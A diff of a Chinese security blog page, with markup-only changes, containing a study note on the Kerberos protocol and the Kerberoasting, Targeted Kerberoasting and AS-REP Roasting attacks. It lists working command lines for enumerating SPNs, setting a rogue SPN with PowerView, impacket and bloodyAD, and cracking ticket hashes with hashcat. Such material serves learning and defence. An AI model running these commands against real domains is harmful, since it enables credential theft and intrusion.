@@ -1,18 +1,15 @@
-
-<!DOCTYPE html><html lang="en">
-
-<head>
+<!DOCTYPE html><html lang="zh-CN"><head>
   <meta charset="utf-8">
   <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
-  
+  <link rel="canonical" href="https://sauy.top/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">
   
   <meta name="generator" content="Hexo 7.3.0">
-  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <meta http-equiv="x-dns-prefetch-control" content="on">
   
   <meta name="renderer" content="webkit">
   <meta name="force-rendering" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
-  <meta name="HandheldFriendly" content="True" >
+  <meta name="HandheldFriendly" content="True">
   <meta name="mobile-web-app-capable" content="yes">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
@@ -20,57 +17,59 @@
   <title>Kerberos协议及其攻击手法 - Sauy's corner</title>
 
   
-    <meta name="description" content="Kerberos协议缩写解释 1234567891011121314151617DC 域控制器 Domain ControllerKDC 密钥分发中心 Key Distribution CenterAS 身份验证服务 Authentication ServiceTGS 票据授予服务 Ticket Granting ServiceTGT 认证票据 Ticket Granting TicketST 服">
+    <meta name="description" content="梳理 Kerberos 中 AS、TGS 与服务端的认证流程，结合域环境学习 Kerberoasting、Targeted Kerberoasting 和 AS-REP Roasting。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Kerberos协议及其攻击手法">
-<meta property="og:url" content="http://example.com/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">
-<meta property="og:site_name" content="Sauy&#39;s corner">
-<meta property="og:description" content="Kerberos协议缩写解释 1234567891011121314151617DC 域控制器 Domain ControllerKDC 密钥分发中心 Key Distribution CenterAS 身份验证服务 Authentication ServiceTGS 票据授予服务 Ticket Granting ServiceTGT 认证票据 Ticket Granting TicketST 服">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/sauy.jpg">
+<meta property="og:url" content="https://sauy.top/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">
+<meta property="og:site_name" content="Sauy's corner">
+<meta property="og:description" content="梳理 Kerberos 中 AS、TGS 与服务端的认证流程，结合域环境学习 Kerberoasting、Targeted Kerberoasting 和 AS-REP Roasting。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sauy.top/images/sauy.jpg">
 <meta property="article:published_time" content="2026-04-06T13:10:58.000Z">
 <meta property="article:modified_time" content="2026-05-13T04:12:20.450Z">
 <meta property="article:author" content="Sauy">
-<meta property="article:tag" content="-域渗透">
+<meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/sauy.jpg">
+<meta name="twitter:image" content="https://sauy.top/images/sauy.jpg">
   
   
   
-  <meta name="keywords" content="-域渗透">
+  <meta name="keywords" content="域渗透">
 
   <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="Sauy's corner" type="application/atom+xml">
   
 
   <link rel="stylesheet" href="/css/main.css?v=1.33.1">
 
 
   
-    <link rel="shortcut icon" href="/images/shengdan.png">
+    <link rel="shortcut icon" href="/images/optimized/bbd11a86c7b12224-32.png" type="image/png" sizes="32x32">
   
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2026-04-06T21:10:58+08:00","dateModified":"2026-05-13T12:12:20+08:00","datePublished":"2026-04-06T21:10:58+08:00","description":"","headline":"Kerberos协议及其攻击手法","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"http://example.com/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/","keywords":"-域渗透","thumbnailUrl":"/images/24.JPG","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg"},"dateCreated":"2026-04-06T21:10:58+08:00","dateModified":"2026-05-13T12:12:20+08:00","datePublished":"2026-04-06T21:10:58+08:00","description":"","headline":"Kerberos协议及其攻击手法","mainEntityOfPage":{"@type":"WebPage","@id":"https://sauy.top/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"},"publisher":{"@type":"Organization","name":"Sauy","sameAs":[],"image":"/images/sauy.jpg","logo":{"@type":"ImageObject","url":"/images/sauy.jpg"}},"url":"https://sauy.top/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/","keywords":"域渗透","thumbnailUrl":"/images/24.JPG","image":1}</script>
   
 </head>
 <body>
 
-<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+<div class="l_body content" id="start" layout="post" type="tech"><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
-<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/images/sauy.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Sauy's corner</div><div class="sub cap">Die With A Smile</div></a></div></header>
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy="" class="avatar" src="/images/optimized/fad17cb6008e6c57-192.webp" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';" loading="eager" decoding="async" srcset="/images/optimized/b053d7b86e84b1be-96.webp 96w, /images/optimized/fad17cb6008e6c57-192.webp 192w" sizes="48px" width="192" height="192" alt="Sauy 的头像"></a><a class="title" href="/"><div class="main">Sauy's corner</div><div class="sub cap">Die With A Smile</div></a></div></header>
 
 <div class="nav-area">
 
 <nav class="menu dis-select"></nav>
 </div>
 <div class="widgets">
-<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
 
 
-<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/09/18/BTC%E7%B3%BB%E7%BB%9F%E8%A7%A3%E6%9E%90/"><span class="title">BTC系统基础</span></a><a class="item title" href="/2026/09/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/"><span class="title">区块链基础知识</span></a><a class="item title" href="/2026/09/15/HTB-Practice/"><span class="title">渗透靶机-wp-长期更新</span></a><a class="item title" href="/2026/04/28/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">反射机制解析</span></a><a class="item title" href="/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><span class="title">Kerberos协议及其攻击手法</span></a><a class="item title" href="/2025/04/06/Sql-labs%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><span class="title">Sql-labs部分题解</span></a><a class="item title" href="/2025/08/29/SSRF/"><span class="title">SSRF</span></a><a class="item title" href="/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"><span class="title">浅谈python内存马</span></a><a class="item title" href="/2025/11/14/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/"><span class="title">Redis主从复制RCE</span></a><a class="item title" href="/2025/04/07/NSSCTF%20Round30%20Basic%E5%8F%8C%E4%BA%BA%E7%BB%84%E9%98%9F%E8%B5%9B/"><span class="title">NSSCTF Round30 Basic双人组队赛</span></a></div></widget>
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/09/18/BTC%E7%B3%BB%E7%BB%9F%E8%A7%A3%E6%9E%90/"><span class="title">BTC系统基础</span></a><a class="item title" href="/2026/09/15/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/"><span class="title">区块链基础知识</span></a><a class="item title" href="/2026/09/15/HTB-Practice/"><span class="title">渗透靶机-wp-长期更新</span></a><a class="item title" href="/2026/04/28/JAVA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">反射机制解析</span></a><a class="item title" href="/2026/04/06/Kerberos%E5%8D%8F%E8%AE%AE%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/"><span class="title">Kerberos协议及其攻击手法</span></a><a class="item title" href="/2025/04/06/Sql-labs%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"><span class="title">Sql-labs部分题解</span></a><a class="item title" href="/2025/08/29/SSRF/"><span class="title">SSRF</span></a><a class="item title" href="/2025/04/20/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"><span class="title">浅谈python内存马</span></a><a class="item title" href="/2025/11/14/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE/"><span class="title">Redis主从复制RCE</span></a><a class="item title" href="/2025/04/07/NSSCTF%20Round30%20Basic%E5%8F%8C%E4%BA%BA%E7%BB%84%E9%98%9F%E8%B5%9B/"><span class="title">NSSCTF Round30 Basic双人组队赛</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -81,9 +80,9 @@
 
 <div class="article banner top">
   <div class="content">
-    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
-<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
-<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2026-04-06T13:10:58.000Z">2026-04-06</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-05-13T04:12:20.450Z">2026-05-13</time></span></div></div></div>
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/">渗透笔记</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-04-06T13:10:58.000Z">2026-04-06</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-05-13T04:12:20.450Z">2026-05-13</time></span></div></div></div>
     
     <div class="bottom only-title">
       
@@ -95,7 +94,7 @@
     
   </div>
   </div><article class="md-text content"><h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>缩写解释</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DC 域控制器 Domain Controller</span><br><span class="line"></span><br><span class="line">KDC 密钥分发中心 Key Distribution Center</span><br><span class="line"></span><br><span class="line">AS 身份验证服务 Authentication Service</span><br><span class="line"></span><br><span class="line">TGS 票据授予服务 Ticket Granting Service</span><br><span class="line"></span><br><span class="line">TGT 认证票据 Ticket Granting Ticket</span><br><span class="line"></span><br><span class="line">ST 服务票据 Service Ticket</span><br><span class="line"></span><br><span class="line">PAC 特权属性证书 Privilege Attribute Certificate</span><br><span class="line"></span><br><span class="line">AD 账户数据库 Account Database（存储所有Client的白名单）</span><br><span class="line"></span><br><span class="line">krbtgt账户（KDC的服务账户）</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DC 域控制器 Domain Controller</span><br><span class="line"></span><br><span class="line">KDC 密钥分发中心 Key Distribution Center</span><br><span class="line"></span><br><span class="line">AS 身份验证服务 Authentication Service</span><br><span class="line"></span><br><span class="line">TGS 票据授予服务 Ticket Granting Service</span><br><span class="line"></span><br><span class="line">TGT 认证票据 Ticket Granting Ticket</span><br><span class="line"></span><br><span class="line">ST 服务票据 Service Ticket</span><br><span class="line"></span><br><span class="line">PAC 特权属性证书 Privilege Attribute Certificate</span><br><span class="line"></span><br><span class="line">AD 账户数据库 Account Database（存储所有Client的白名单）</span><br><span class="line"></span><br><span class="line">krbtgt账户（KDC的服务账户）</span><br></pre></td></tr></tbody></table></figure>
 
 <p>在Kerberos协议中主要是有三个角色：</p>
 <ul>
@@ -108,7 +107,7 @@
 <li>身份验证服务AS：验证Client的身份，验证通过之后，AS就会发放TGT票据给Client。</li>
 <li>票据授予服务TGS：当Client获取的TGT票据后，TGS会给Clinet换取访问Server端的ST服务票据。</li>
 </ul>
-<p><img src="https://img2024.cnblogs.com/blog/3222269/202405/3222269-20240511223106237-1053628627.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3222269/202405/3222269-20240511223106237-1053628627.png" loading="lazy" decoding="async"></p>
 <h2 id="Client和AS-Authentication-Service-交互"><a href="#Client和AS-Authentication-Service-交互" class="headerlink" title="Client和AS(Authentication Service)交互"></a>Client和AS(Authentication Service)交互</h2><p><strong>step1:</strong> client向KDC的AS认证服务请求TGT票据</p>
 <p>**step2:**客户端通过AS认证后，KDC会给client发放TGT票据</p>
 <h2 id="Client-与-TGS-的交互"><a href="#Client-与-TGS-的交互" class="headerlink" title="Client 与 TGS 的交互"></a>Client 与 TGS 的交互</h2><p>**step3:**client带上TGT票据，向TGS服务请求ST服务票据</p>
@@ -116,91 +115,91 @@
 <h2 id="Client-与-Server-的交互"><a href="#Client-与-Server-的交互" class="headerlink" title="Client 与 Server 的交互"></a>Client 与 Server 的交互</h2><p>**step5:**client使用ST服务票据向appliacation server请求服务</p>
 <p>**step6:**PAC校验，服务端拿到PAC询问KDC客户端是否有权限，KDC将客户端的权限信息返回给服务端，判断客户端是否有权限访问该服务，并把结果返回给客户端</p>
 <p>流程图：</p>
-<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe55513881.webp" alt="image-20260318222855551"> </p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe55513881.webp" alt="image-20260318222855551" loading="lazy" decoding="async"> </p>
 <p>关键名词</p>
-<p><img src="https://image.3001.net/images/20230707/1688740789_64a823b58c501523cd85f.png" alt="img"></p>
+<p><img src="https://image.3001.net/images/20230707/1688740789_64a823b58c501523cd85f.png" alt="img" loading="lazy" decoding="async"></p>
 <h2 id="kerberoasting攻击"><a href="#kerberoasting攻击" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h2><h3 id="SPN（service-principal-name）服务主体名称"><a href="#SPN（service-principal-name）服务主体名称" class="headerlink" title="SPN（service principal name）服务主体名称"></a>SPN（service principal name）服务主体名称</h3><p>Windows域环境中用于标识服务或应用程序的唯一标识符，kerberos认证使用SPN来关联服务和运行的应用程序</p>
 <p>格式</p>
-<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe553b3e90.webp" alt="image-20260318211348104"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe553b3e90.webp" alt="image-20260318211348104" loading="lazy" decoding="async"></p>
 <h3 id="kerberoasting攻击-1"><a href="#kerberoasting攻击-1" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h3><p><code>Kerberoasting的前提：服务SPN必须注册在域用户账户下，因为机器账户的密码是随机生成的，基本爆破不了</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务票据会使用服务账户的哈希进行加密，这样一来，Windows域中任何经过身份验证的用户都可以从 TGS 处请求 ST 服务票据。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务票据会使用服务账户的哈希进行加密，这样一来，Windows域中任何经过身份验证的用户都可以从 TGS 处请求 ST 服务票据。由于服务票证是用链接到请求 SPN 的帐户的哈希加密的，所以攻击者可以离线破解这个加密块，恢复帐户的明文密码</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="https://picui.ogmua.cn/s1/2026/03/20/69bcdc3bb174f.webp" alt="image-20260320133447236.png"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/20/69bcdc3bb174f.webp" alt="image-20260320133447236.png" loading="lazy" decoding="async"></p>
 <p>客户端请求一个服务票据并离线破解服务账户的密码hash</p>
-<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe554d39a2.webp" alt="image-20260318215315260"></p>
+<p><img src="https://picui.ogmua.cn/s1/2026/03/19/69bbe554d39a2.webp" alt="image-20260318215315260" loading="lazy" decoding="async"></p>
 <h4 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h4><h3 id="枚举SPN"><a href="#枚举SPN" class="headerlink" title="枚举SPN"></a><strong>枚举SPN</strong></h3><p>SetSPN</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -Q */*    # 查看当前域内所有的 SPNsetspn -T whoamianony.org -Q */*    # 查看指定域 whoamianony.org 注册的SPN, 如果指定域不存在, 则默认切换到查找本域的 SPNsetspn -L &lt;username&gt;/&lt;hostname&gt;    # 查找指定用户/主机名注册的 SPN</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -Q */*    # 查看当前域内所有的 SPNsetspn -T whoamianony.org -Q */*    # 查看指定域 whoamianony.org 注册的SPN, 如果指定域不存在, 则默认切换到查找本域的 SPNsetspn -L &lt;username&gt;/&lt;hostname&gt;    # 查找指定用户/主机名注册的 SPN</span><br></pre></td></tr></tbody></table></figure>
 
 <p>使用 GetUserSPNs.ps1 脚本</p>
 <p>•项目地址：<a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast.git">https://github.com/nidem/kerberoast.git</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\GetUserSPNs.ps1</span><br></pre></td></tr></tbody></table></figure>
 
 <p>使用 PowerView.ps1 脚本</p>
 <p>•项目地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1Get-NetUser -SPN</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1Get-NetUser -SPN</span><br></pre></td></tr></tbody></table></figure>
 
 <h4 id="导出票据获取hash："><a href="#导出票据获取hash：" class="headerlink" title="导出票据获取hash："></a>导出票据获取hash：</h4><p>mimikatz可以导出票据 或者使用rebeus可以直接拿到票据里的hash（前提都是你可以RDPWindows桌面这样 这两工具方便点</p>
 <p>如果只有ip用户密码 那可以使用targetedKerberoast或者impacket-GetUserSPNs 模块</p>
 <h4 id="爆破hash："><a href="#爆破hash：" class="headerlink" title="爆破hash："></a>爆破hash：</h4><p>最后拿到的hash使用hachcat或者john爆破就行</p>
 <p>这样我们就可以拿到指定用户的密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></tbody></table></figure>
 
-<h2 id="Targeted-kerberoasting"><a href="#Targeted-kerberoasting" class="headerlink" title="Targeted kerberoasting"></a>Targeted kerberoasting</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果发现对某个AD用户有GeneriteWrite或GeneriteAll权限，则可以给账户设置一个SPN,然后kerberoast用户账户，破解密码hash。</span><br></pre></td></tr></table></figure>
+<h2 id="Targeted-kerberoasting"><a href="#Targeted-kerberoasting" class="headerlink" title="Targeted kerberoasting"></a>Targeted kerberoasting</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果发现对某个AD用户有GeneriteWrite或GeneriteAll权限，则可以给账户设置一个SPN,然后kerberoast用户账户，破解密码hash。</span><br></pre></td></tr></tbody></table></figure>
 
 <p>攻击步骤</p>
 <h3 id="枚举ACL"><a href="#枚举ACL" class="headerlink" title="枚举ACL"></a>枚举ACL</h3><p>寻找拥有对其有GeneriteWrite或GeneriteAll权限的用户</p>
 <p>使用Find-InterestingDomainAcl（powershell）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;$_.SecurityIdentifier -match &quot;rto&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.SecurityIdentifier -match "rto"}</span><br></pre></td></tr></tbody></table></figure>
 
 <p>或者bloodhound探测域内环境也可以看到</p>
 <h3 id="设置SPN"><a href="#设置SPN" class="headerlink" title="设置SPN"></a>设置SPN</h3><p>本地</p>
 <p><strong>windows</strong>原生工具</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -S &quot;service/target-hostname&quot; TargetUser</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -S "service/target-hostname" TargetUser</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>PowerView</strong> 脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity &quot;TargetUser&quot; -Set @&#123;serviceprincipalname=&quot;HTTP/fake.service.com&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity "TargetUser" -Set @{serviceprincipalname="HTTP/fake.service.com"}</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>远程连接</strong></p>
 <p><strong>impacket</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addspn -u &#x27;domain.local\YourUser&#x27; -p &#x27;YourPass&#x27; -dc-ip 10.10.10.10 -additional &quot;MSSQLSvc/target-user.domain.local:1433&quot; &quot;TargetUser&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-addspn -u 'domain.local\YourUser' -p 'YourPass' -dc-ip 10.10.10.10 -additional "MSSQLSvc/target-user.domain.local:1433" "TargetUser"</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>bloodyAD</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.10.10.10 -u &quot;YourUser&quot; -p &quot;YourPass&quot; add spn &quot;TargetUser&quot; &quot;CIFS/fake.service.com&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.10.10.10 -u "YourUser" -p "YourPass" add spn "TargetUser" "CIFS/fake.service.com"</span><br></pre></td></tr></tbody></table></figure>
 
 <p><strong>删除SPN</strong></p>
 <h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><h3 id="kerberos-preauthentication-kerbers-预认证"><a href="#kerberos-preauthentication-kerbers-预认证" class="headerlink" title="kerberos preauthentication (kerbers 预认证)"></a>kerberos preauthentication (kerbers 预认证)</h3><p>step1：客户端像PDC发送一个<strong>AS-REQ</strong> 包含用户密码衍生的hash加密的时间戳以及用户名</p>
 <p>step2：域控收到请求，查找和用户名关联的密码hash，并尝试解密时间戳。如果解密成功并且时间戳没有重复，则认证成功，向客户端返回<strong>AS-REP</strong>，AS-REP包含用户密码hash加密的session-key和TGT。</p>
